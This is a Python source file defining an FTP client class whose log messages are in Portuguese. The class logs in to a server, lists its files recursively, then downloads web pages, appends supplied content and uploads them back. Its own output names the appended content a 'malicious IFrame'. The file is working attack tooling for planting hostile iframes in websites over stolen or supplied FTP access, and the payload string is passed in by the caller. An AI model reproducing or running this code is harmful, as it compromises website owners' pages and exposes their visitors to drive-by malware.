import ftplib
import io
import os


class FTPClient:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.ftp = None
        self.current_dir: str = '/home/'+user

    def connect_ftp(self):
        try:
            ftp = ftplib.FTP(host=self.host, timeout=5)
            connect = ftp.login(self.user, self.password)

            if all(x in connect.lower() for x in ['230', 'login successful.']):
                self.ftp = ftp
                print(connect)
                return True
            return False
        except Exception as e:
            pass

    def get_files(self, path=''):
        files = []
        for item in self.ftp.nlst(path or self.current_dir):
            if '.' in item:
                files.append(item.replace(self.current_dir, '')[1:])
            else:
                files += self.get_files(path=item)
        return files

    def page_inject(self, file_name, content):
        buffer = io.BytesIO()
        try:
            self.ftp.retrbinary(f'RETR {file_name}', buffer.write)
            print('[+] Página baixada: ' + file_name)
            buffer.write(f'\n{content}'.encode())
            print('[+] Injetado IFrame malicioso em: ' + file_name)
            buffer.seek(0)
            self.ftp.storbinary(f'STOR {file_name}', buffer)
            print('[+] Página injetada enviada: ' + file_name)
        except Exception as e:
            print(e)
            pass

    def paginaInject(self, pagina, redirecionar):

        if not os.path.exists("cache"):
            os.mkdir("cache")
            
        path = os.path.dirname("cache/" + pagina)
        
        if not os.path.exists(path):
            os.makedirs(path)
        
        f = open("cache/" + pagina + '.tmp', 'w')
        self.ftp.retrlines('RETR ' + pagina, f.write)
        print('[+] Página baixada: ' + pagina)

        f.write(redirecionar)
        f.close()
        print('[+] Injetado IFrame malicioso em: ' + pagina)

        self.ftp.storbinary('STOR ' + pagina, open("cache/" + pagina + '.tmp', 'rb'))
        print('[+] Página injetada enviada: ' + pagina)
